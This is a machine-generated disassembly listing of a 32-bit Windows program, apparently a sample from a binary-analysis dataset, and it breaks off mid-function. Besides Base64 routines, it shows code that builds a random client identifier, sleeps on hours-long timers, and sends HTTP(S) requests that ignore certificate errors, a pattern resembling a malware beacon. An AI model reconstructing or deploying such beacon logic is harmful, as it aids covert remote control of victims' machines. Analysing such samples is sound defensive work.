sub_401050
push esi
mov esi eax
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
lea esp [ esp ]
pop edi
xor eax eax
pop esi
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
retn
cmp esi 0x1
jbe r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_4010d0
push 0xffffffff
push sub_420898
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x8 ] esi
call sub_40e7cf
xor eax eax
mov [ esp + 0x14 ] eax
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
push 0xffffffff
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] 0xf
push eax
mov [ ecx + 0x4 ] al
mov eax [ esp + 0x24 ]
push eax
call sub_408b10
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x4
sub_401190
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x24 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] eax
mov [ esi + 0x10 ] al
mov ecx esi
pop esi
jmp sub_40e8ad
mov eax [ esi + 0x10 ]
push eax
call sub_40f2fb
add esp 0x4
sub_4011d0
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x24 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] eax
mov ecx esi
mov [ esi + 0x10 ] al
call sub_40e8ad
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_40f2fb
add esp 0x4
mov eax esi
pop esi
retn 0x4
push esi
call sub_40f2fb
add esp 0x4
sub_401240
push 0xffffffff
push sub_420868
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
mov edi [ esp + 0x20 ]
push edi
call sub_40e850
xor edx edx
mov [ esp + 0x18 ] edx
push 0xffffffff
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
lea eax [ edi + 0xc ]
push edx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] edx
push eax
mov [ ecx + 0x4 ] dl
call sub_408b10
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x4
sub_4012c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x144
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x140 ] eax
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov ebx edx
test ecx ecx
jne r-xdata
lea eax [ ecx - 0x3 ]
xor edx edx
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x18 ] esi
mov [ esp + 0x10 ] ebx
test eax eax
jle r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
cmp edx ecx
jge r-xdata
lea ecx [ eax - 0x1 ]
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
inc edx
lea eax [ edx * 4 ]
lea ecx [ edx + edx * 2 ]
mov [ esp + 0x14 ] edx
mov [ esp + 0x1c ] eax
mov [ esp + 0x24 ] ecx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov [ ebp + 0x8 ] eax
mov ecx eax
mov ecx [ esp + 0x14c ]
mov eax [ esp + 0x1c ]
pop edi
pop esi
mov [ ebx ] 0x0
pop ebx
xor ecx esp
call sub_40e1e0
mov esp ebp
pop ebp
retn
sub ecx edx
xor edx edx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] edx
test ecx ecx
jle r-xdata
mov dl 0x3d
mov dl [ esp + edx + 0x100 ]
jmp r-xdata
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x28 ]
[ edi ] [ esi ]
mov eax edx
shr eax 0x2
and eax 0x3f
movsb [ edi ] [ esi ]
cmp eax 0x3f
ja r-xdata
mov edx [ esp + 0x18 ]
push ecx
push edx
lea eax [ esp + 0x1c ]
push eax
call sub_4158c0
mov edx [ esp + 0x20 ]
add esp 0xc
mov dl 0x3d
mov dl [ esp + edx + 0x70 ]
jmp r-xdata
movsx ecx dl
mov [ esp + 0x20 ] ecx
mov edx eax
shr edx 0xc
mov ecx eax
and ecx 0x3
shl ecx 0x4
and edx 0xf
or edx ecx
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x70 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
cmp edx 0x3f
ja r-xdata
mov al 0x3d
mov al [ esp + eax + 0x28 ]
jmp r-xdata
mov dl 0x3d
mov dl [ esp + edx + 0xb8 ]
jmp r-xdata
movsx ebx dl
mov edx eax
shr edx 0x8
and edx 0xf
add edx edx
mov ecx eax
shr ecx 0x16
and ecx 0x3
add edx edx
or edx ecx
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0xb8 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
cmp edx 0x3f
ja r-xdata
mov al 0x3d
mov al [ esp + eax + 0x28 ]
jmp r-xdata
mov [ ebx ] al
mov eax edx
shr eax 0xc
mov ecx edx
and ecx 0x3
shl ecx 0x4
and eax 0xf
or eax ecx
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x28 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
cmp eax 0x3f
ja r-xdata
mov al 0x3d
mov al [ esp + eax + 0x28 ]
jmp r-xdata
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x28 ]
[ edi ] [ esi ]
shr eax 0x10
and eax 0x3f
movsx edx dl
movsb [ edi ] [ esi ]
cmp eax 0x3f
ja r-xdata
mov al 0x3d
mov eax edx
shr eax 0x8
and eax 0xf
add eax eax
mov ecx edx
shr ecx 0x16
and ecx 0x3
add eax eax
or eax ecx
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x28 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
cmp eax 0x3f
ja r-xdata
cmp [ esp + 0x10 ] 0x1
mov [ ebx + 0x1 ] al
jle r-xdata
mov edx [ esp + 0x18 ]
mov eax [ edx ]
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x100 ]
[ edi ] [ esi ]
mov edx eax
shr edx 0x2
and edx 0x3f
movsb [ edi ] [ esi ]
cmp edx 0x3f
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ esp + 0x24 ]
mov ebx eax
add [ esp + 0x18 ] 0x3
movsx ecx al
mov eax [ esp + 0x10 ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
or ecx ebx
shl ecx 0x8
or ecx [ esp + 0x20 ]
add eax 0x4
sub [ esp + 0x14 ] 0x1
mov [ eax - 0x4 ] ecx
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov dl 0x3d
mov [ ebx + 0x3 ] dl
add ebx 0x4
add eax 0x4
mov [ ebx ] 0x0
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x140 ]
xor ecx esp
call sub_40e1e0
mov esp ebp
pop ebp
retn
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x28 ]
[ edi ] [ esi ]
shr edx 0x10
and edx 0x3f
movsb [ edi ] [ esi ]
cmp edx 0x3f
ja r-xdata
mov al [ esp + eax + 0x28 ]
jmp r-xdata
mov dl [ esp + edx + 0x28 ]
mov eax [ esp + 0x1c ]
mov [ ebx + 0x3 ] dl
add ebx 0x4
add eax 0x4
mov [ ebx ] 0x0
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x140 ]
xor ecx esp
call sub_40e1e0
mov esp ebp
pop ebp
retn
cmp [ esp + 0x10 ] 0x2
mov [ ebx + 0x2 ] al
jle r-xdata
sub_4015a0
sub esp 0xc
push ebx
push ebp
xor ebx ebx
push esi
push edi
cmp [ esp + 0x24 ] ebx
jne r-xdata
mov eax [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x24 ]
add eax 0xfffffffc
cmp eax ebx
mov [ esp + 0x10 ] ebx
mov ebp ecx
mov [ esp + 0x18 ] ebx
jle r-xdata
mov eax ecx
lea esi [ eax + 0x1 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x24 ]
cmp eax ecx
jge r-xdata
dec eax
shr eax 0x2
inc eax
lea ecx [ eax + eax * 2 ]
lea edx [ eax * 4 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x18 ] edx
lea ecx [ ecx ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
mov [ esp + 0x24 ] eax
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ ecx ] 0x0
pop ebx
add esp 0xc
retn
sub ecx eax
xor eax eax
mov [ esp + 0x24 ] eax
test ecx ecx
jle r-xdata
cmp dl 0x61
jl r-xdata
cmp dl 0x5a
jg r-xdata
or edx 0xffffffff
cmp al 0x41
jl r-xdata
push ecx
lea eax [ esp + 0x28 ]
push ebp
push eax
call sub_4158c0
mov eax [ esp + 0x30 ]
add esp 0xc
cmp dl 0x30
jl r-xdata
cmp dl 0x7a
jg r-xdata
movsx esi dl
sub esi 0x41
jmp r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x5a
jg r-xdata
cmp dl 0x2b
jne r-xdata
cmp dl 0x39
jg r-xdata
movsx esi dl
sub esi 0x47
jmp r-xdata
mov eax edx
shr eax 0x8
mov bl al
sub bl 0x41
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x7a
jg r-xdata
movsx edx al
sub edx 0x41
jmp r-xdata
cmp dl 0x2f
jne r-xdata
mov esi 0x3e
jmp r-xdata
movsx esi dl
add esi 0x4
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
cmp al 0x2b
jne r-xdata
cmp al 0x39
jg r-xdata
movsx edx al
sub edx 0x47
jmp r-xdata
shr eax 0x8
mov bl al
sub bl 0x41
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
mov esi 0x3f
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
lea edi [ ecx * 4 ]
sar edi 0x6
lea ecx [ esi * 4 ]
or edi ecx
mov bl al
sub bl 0x41
and edi 0xff
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
cmp al 0x2f
jne r-xdata
mov edx 0x3e
jmp r-xdata
movsx edx al
add edx 0x4
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
mov edx 0x3f
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
mov edi [ esp + 0x20 ]
mov ebp [ esp + 0x10 ]
mov esi [ esp + 0x24 ]
add ecx ecx
add ecx ecx
add dl dl
sar ecx 0x6
add dl dl
or cl dl
mov [ edi ] cl
inc edi
inc ebp
cmp al 0x3d
je r-xdata
cmp al 0x2f
jne r-xdata
mov ecx 0x3e
jmp r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
mov eax edx
shr eax 0x10
mov bl al
sub bl 0x41
or esi 0xffffffff
cmp bl 0x19
ja r-xdata
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov eax esi
shr eax 0x10
cmp al 0x3d
je r-xdata
mov edx esi
shr edx 0x10
cmp dl 0x3d
je r-xdata
mov ecx 0x3f
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx esi al
sub esi 0x41
jmp r-xdata
cmp al 0x2f
jne r-xdata
mov ecx 0x3e
jmp r-xdata
mov [ edi ] 0x0
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
add esp 0xc
retn
mov edx esi
shr edx 0x18
cmp edx 0x3d
je r-xdata
mov bl al
sub bl 0x41
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
cmp al 0x2f
jne r-xdata
mov ecx 0x3e
jmp r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx esi al
sub esi 0x47
jmp r-xdata
add esi esi
add esi esi
sar esi 0x4
shl ecx 0x4
or esi ecx
mov bl al
sub bl 0x41
and esi 0xff
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
mov ecx 0x3f
mov bl al
sub bl 0x41
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
mov ecx 0x3f
cmp al 0x2b
jne r-xdata
movsx esi al
add esi 0x4
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
mov bl dl
sub bl 0x41
or eax 0xffffffff
cmp bl 0x19
ja r-xdata
cmp al 0x2f
jne r-xdata
mov esi 0x3e
jmp r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
shr edx 0x18
mov bl dl
sub bl 0x41
or eax 0xffffffff
cmp bl 0x19
ja r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
mov bl dl
sub bl 0x41
or eax 0xffffffff
cmp bl 0x19
ja r-xdata
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov bl dl
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx eax dl
sub eax 0x41
jmp r-xdata
mov esi 0x3f
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov bl dl
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx eax dl
sub eax 0x41
jmp r-xdata
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov bl dl
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx eax dl
sub eax 0x41
jmp r-xdata
cmp al 0x2f
jne r-xdata
mov ecx 0x3e
jmp r-xdata
mov bl dl
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx eax dl
sub eax 0x47
jmp r-xdata
lea edx [ eax * 4 ]
sar edx 0x4
shl cl 0x4
or dl cl
mov [ edi ] dl
inc edi
inc ebp
cmp al 0x2f
jne r-xdata
mov ecx 0x3e
jmp r-xdata
mov bl dl
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx eax dl
sub eax 0x47
jmp r-xdata
lea edx [ eax * 4 ]
mov eax [ esp + 0x20 ]
sar edx 0x2
shl ecx 0x6
or edx ecx
and edx 0xff
shl edx 0x8
or edx esi
shl edx 0x8
or edx edi
mov [ eax ] edx
add eax 0x3
add ebp 0x4
sub [ esp + 0x14 ] 0x1
mov [ esp + 0x20 ] eax
jne r-xdata
cmp al 0x2f
jne r-xdata
mov ecx 0x3e
jmp r-xdata
mov bl dl
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx eax dl
sub eax 0x47
jmp r-xdata
add eax eax
add eax eax
sar eax 0x2
shl cl 0x6
or al cl
mov [ edi ] al
inc edi
inc ebp
mov ecx 0x3f
cmp dl 0x2b
jne r-xdata
movsx eax dl
add eax 0x4
jmp r-xdata
mov ecx 0x3f
cmp dl 0x2b
jne r-xdata
movsx eax dl
add eax 0x4
jmp r-xdata
mov edx [ ebp ]
or esi 0xffffffff
cmp dl 0x41
jl r-xdata
mov ecx 0x3f
cmp dl 0x2b
jne r-xdata
movsx eax dl
add eax 0x4
jmp r-xdata
cmp dl 0x2f
jne r-xdata
mov eax 0x3e
jmp r-xdata
cmp dl 0x2f
jne r-xdata
mov eax 0x3e
jmp r-xdata
cmp dl 0x2f
jne r-xdata
mov eax 0x3e
jmp r-xdata
mov eax 0x3f
mov eax 0x3f
mov eax 0x3f
sub_401ae0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x19c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x198 ] eax
push ebx
push esi
push edi
push 0x0
call sub_40fcc1
add esp 0x4
push eax
call sub_40f2c7
add esp 0x4
lea eax [ esp + 0x10 ]
push eax
push 0x202
call WSAStartup
call sub_407570
test eax eax
je r-xdata
mov ecx [ esp + 0x1a4 ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_40e1e0
mov esp ebp
pop ebp
retn
movzx ecx [ rw-data ]
push 0x408
push 0x0
push rw-data
mov [ rw-data ] ecx
call sub_414890
add esp 0xc
push 0x408
push 0x0
push rw-data
call sub_414890
add esp 0xc
xor esi esi
call sub_40f2d9
xor edx edx
mov ecx 0x3f
div ecx
inc esi
cmp esi 0x6
mov dl [ edx + r--data ]
mov [ esi + rw-data ] dl
jl r-xdata
call sub_404420
call sub_404340
push 0x0
push 0x0
push 0x1
push 0x0
call [ CreateEventA@IAT ]
mov edi [ WaitForSingleObject@IAT ]
mov ebx [ CloseHandle@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
imul eax eax 0x3e8
push eax
mov eax [ rw-data ]
push eax
call edi
test eax eax
je r-xdata
movsx ecx [ rw-data ]
push ecx
call sub_40ef5b
add esp 0x4
push rw-data
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call inet_addr
cmp eax 0xffffffff
je r-xdata
call gethostbyname
test eax eax
jne r-xdata
mov cl [ eax + rw-data ]
mov [ eax + rw-data ] cl
inc eax
test cl cl
jne r-xdata
push 0xdbba00
jmp r-xdata
mov esi eax
jmp r-xdata
mov edx [ eax + 0xc ]
mov eax [ edx ]
mov esi [ eax ]
call WSAGetLastError
mov esi 0x3
mov [ rw-data ] esi
lea esp [ esp ]
mov ecx [ rw-data ]
push ecx
push 0x100
push 0x0
push rw-data
call sub_414890
add esp 0xc
push esi
call inet_ntoa
mov edx rw-data
mov cl [ eax ]
mov [ edx ] cl
inc eax
inc edx
test cl cl
jne r-xdata
mov ecx rw-data
mov eax rw-data
cmp eax 0x13
je r-xdata
mov eax [ rw-data ]
push 0x6ddd00
push eax
jmp r-xdata
call sub_408190
test eax eax
jle r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
imul edx edx 0x3e8
push edx
push eax
mov [ rw-data ] esi
call edi
test eax eax
je r-xdata
cmp eax 0x14
jne r-xdata
call edi
test eax eax
je r-xdata
mov edx [ rw-data ]
push 0xdbba00
push edx
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp eax 0x10
je r-xdata
mov edx [ rw-data ]
mov ecx 0x4
sub ecx [ rw-data ]
imul ecx ecx 0xea60
push ecx
push edx
jmp r-xdata
sub [ rw-data ] 0x1
jne r-xdata
call edi
test eax eax
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
push 0x112a880
mov ecx [ rw-data ]
mov eax 0x4
sub eax [ rw-data ]
imul eax eax 0xea60
push eax
push ecx
cmp eax 0x16
jne r-xdata
push 0x0
push r--data
mov ecx rw-data
call sub_409850
push 0x0
push 0x0
push 0x1
push 0x0
mov [ rw-data ] 0xf
call [ CreateEventA@IAT ]
push 0x0
push 0x0
push 0x0
push sub_401e40
push 0x0
push 0x0
mov [ rw-data ] eax
call sub_40ec0d
push 0x0
push 0x0
push 0x0
push sub_402900
push 0x0
push 0x0
mov [ rw-data ] eax
call sub_40ec0d
add esp 0x30
mov [ rw-data ] eax
mov eax [ rw-data ]
push 0xffffffff
push eax
call edi
mov ecx [ rw-data ]
push ecx
call ebx
mov edx [ rw-data ]
push edx
call ebx
mov eax [ rw-data ]
cmp eax 0x18
jne r-xdata
jmp r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
cmp eax 0x19
je r-xdata
mov eax [ rw-data ]
mov edx 0x4
sub edx [ rw-data ]
imul edx edx 0xea60
push edx
push eax
jmp r-xdata
cmp eax 0x12
je r-xdata
cmp eax 0x11
jne r-xdata
sub_401e40
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4210b6
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x42c94
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x42c90 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x42ca8 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
lea eax [ esp + 0x14 ]
mov [ esp + 0x42cb0 ] ebx
mov [ rw-data ] eax
mov eax rw-data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
lea esi [ esp + 0x14 ]
mov edx rw-data
jne r-xdata
call sub_40de20
push ebx
cmp [ rw-data ] ebx
je r-xdata
mov edx r--data
mov edx [ esp + 0x1c ]
push ebx
push 0x3
push ebx
push ebx
push 0x50
push rw-data
push edx
mov ecx [ esp + 0x1c ]
push 0x800000
push 0x3
push ebx
push ebx
push 0x1bb
push rw-data
push ecx
jmp r-xdata
push 0x7ff
lea eax [ esp + 0x4a1 ]
push ebx
push eax
mov [ esp + 0x4a8 ] bl
call sub_414890
add esp 0xc
push ebx
call sub_40fcc1
add esp 0x4
push eax
call sub_40f2c7
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
call [ InternetConnectA@IAT ]
mov [ esp + 0x1c ] eax
cmp eax ebx
jne r-xdata
push 0x84080000
push ebx
push ebx
push r--data
push edx
mov [ esp + 0x54 ] eax
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x34 ]
push r--data
push eax
call [ HttpOpenRequestA@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
push 0x84880000
push ebx
push ebx
push r--data
push edx
mov [ esp + 0x48 ] eax
mov [ esp + 0x4c ] eax
mov eax [ esp + 0x34 ]
push r--data
push eax
call [ HttpOpenRequestA@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
push eax
call [ InternetCloseHandle@IAT ]
mov [ esp + 0x18 ] ebx
mov edi [ InternetSetOptionA@IAT ]
push 0x4
lea ecx [ esp + 0x24 ]
push ecx
push 0x41
push esi
mov [ esp + 0x30 ] ebx
call edi
cmp [ esp + 0x3c ] 0xffffffff
je r-xdata
mov [ esp + 0x10 ] ebx
jmp r-xdata
lea ecx [ esp + 0x20 ]
push ecx
push rw-data
push 0x1f
push esi
mov [ esp + 0x30 ] 0x4
call [ InternetQueryOptionA@IAT ]
mov edi [ InternetSetOptionA@IAT ]
or [ rw-data ] 0x3180
push 0x4
push rw-data
push 0x1f
push esi
call edi
push 0x4
lea edx [ esp + 0x5c ]
push edx
push 0x41
push esi
mov [ esp + 0x68 ] ebx
call edi
cmp [ esp + 0x30 ] 0xffffffff
je r-xdata
xor edi edi
mov [ esp + 0x10 ] edi
jmp r-xdata
cmp [ esp + 0x28 ] 0xffffffff
je r-xdata
push 0x4
lea edx [ esp + 0x40 ]
push edx
push 0x6
push esi
call edi
test eax eax
jne r-xdata
mov edi [ esp + 0x10 ]
cmp [ esp + 0x34 ] 0xffffffff
je r-xdata
push 0x4
lea eax [ esp + 0x34 ]
push eax
push 0x6
push esi
call edi
test eax eax
jne r-xdata
push 0x3ff
lea ecx [ esp + 0xa1 ]
push ebx
push ecx
mov [ esp + 0xa8 ] bl
call sub_414890
add esp 0xc
push r--data
push r--data
lea edx [ esp + 0xa4 ]
push r--data
push edx
call sub_40e24c
mov esi [ HttpAddRequestHeadersA@IAT ]
add esp 0x10
push 0xa0000000
push 0xffffffff
lea eax [ esp + 0xa4 ]
push eax
push edi
call esi
push 0x3ff
lea ecx [ esp + 0xa1 ]
push ebx
push ecx
mov [ esp + 0xa8 ] bl
call sub_414890
add esp 0xc
push r--data
push r--data
lea edx [ esp + 0xa4 ]
push r--data
push edx
call sub_40e24c
add esp 0x10
push 0xa0000000
push 0xffffffff
lea eax [ esp + 0xa4 ]
push eax
push edi
call esi
push 0x3ff
lea ecx [ esp + 0xa1 ]
push ebx
push ecx
mov [ esp + 0xa8 ] bl
call sub_414890
add esp 0xc
push r--data
push r--data
lea edx [ esp + 0xa4 ]
push r--data
push edx
call sub_40e24c
add esp 0x10
push 0xa0000000
push 0xffffffff
lea eax [ esp + 0xa4 ]
push eax
push edi
call esi
push 0x3ff
lea ecx [ esp + 0xa1 ]
push ebx
push ecx
mov [ esp + 0xa8 ] bl
call sub_414890
add esp 0xc
push r--data
push r--data
lea edx [ esp + 0xa4 ]
push r--data
push edx
call sub_40e24c
add esp 0x10
push 0xa0000000
push 0xffffffff
lea eax [ esp + 0xa4 ]
push eax
push edi
call esi
push ebx
push r--data
lea ecx [ esp + 0x68 ]
mov [ esp + 0x80 ] 0xf
mov [ esp + 0x7c ] ebx
mov [ esp + 0x6c ] bl
call sub_409850
push 0xfff
lea ecx [ esp + 0x1ca1 ]
push ebx
mov [ esp + 0x42cb8 ] 0x1
push ecx
mov [ esp + 0x1ca8 ] bl
call sub_414890
mov eax rw-data
add esp 0xc
lea esi [ eax + 0x1 ]
mov [ esp + 0x10 ] esi
push 0x4
lea eax [ esp + 0x2c ]
push eax
push 0x5
push esi
call edi
mov [ esp + 0x10 ] ebx
test eax eax
je r-xdata
mov [ esp + 0x10 ] ebx
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
lea edx [ esp + 0x1c9c ]
push rw-data
push edx
mov esi eax
call sub_404890
add esp 0x8
cmp [ esp + 0x74 ] ebx
je r-xdata
push 0x4
lea ecx [ esp + 0x38 ]
push ecx
push 0x5
push esi
call edi
test eax eax
jne r-xdata
mov [ esp + 0x10 ] ebx
jmp r-xdata
push 0x4
push r--data
lea eax [ esp + 0x68 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x68 ]
call sub_409740
lea eax [ esp + 0x1c9c ]
lea edx [ eax + 0x1 ]
mov bl 0x3b
lea esi [ esp + 0x60 ]
call sub_408a80
xor ebx ebx
mov [ esp + 0x10 ] ebx
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x1ca0 ]
push eax
lea eax [ esp + 0x68 ]
call sub_409740
cmp [ esp + 0x74 ] ebx
je r-xdata
push 0x4
push r--data
lea eax [ esp + 0x68 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x68 ]
call sub_409740
mov eax rw-data
lea edx [ eax + 0x1 ]
mov bl 0x3b
lea esi [ esp + 0x60 ]
call sub_408a80
xor ebx ebx
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push rw-data
lea eax [ esp + 0x68 ]
call sub_409740
mov esi [ rw-data ]
lea ecx [ esi - 0x1 ]
cmp ecx 0xfe
ja r-xdata
cmp [ esp + 0x78 ] 0x10
mov esi [ esp + 0x64 ]
jae r-xdata
push 0x1ff
lea edx [ esp + 0xa1 ]
push ebx
push edx
mov [ esp + 0xa8 ] bl
call sub_414890
mov eax [ rw-data ]
add esp 0xc
cmp [ rw-data ] 0x10
jae r-xdata
push 0x3ff
lea edx [ esp + 0xa1 ]
push ebx
push edx
mov [ esp + 0xa8 ] bl
call sub_414890
add esp 0xc
push esi
push r--data
lea eax [ esp + 0xa4 ]
push r--data
push eax
call sub_40e24c
add esp 0x10
push 0xa0000000
push 0xffffffff
lea ecx [ esp + 0xa4 ]
push ecx
push edi
call [ HttpAddRequestHeadersA@IAT ]
push ebx
push ebx
push ebx
push ebx
push edi
call [ HttpSendRequestA@IAT ]
test eax eax
je r-xdata
lea esi [ esp + 0x64 ]
push eax
lea eax [ esp + 0xa0 ]
push eax
call sub_404890
add esp 0x8
cmp [ esp + 0x74 ] ebx
je r-xdata
mov eax rw-data
call [ GetLastError@IAT ]
mov [ esp + 0x14 ] eax
jmp r-xdata
mov [ esp + 0x50 ] ebx
mov [ esp + 0x48 ] 0x4
cmp edi ebx
je r-xdata
push 0x4
push r--data
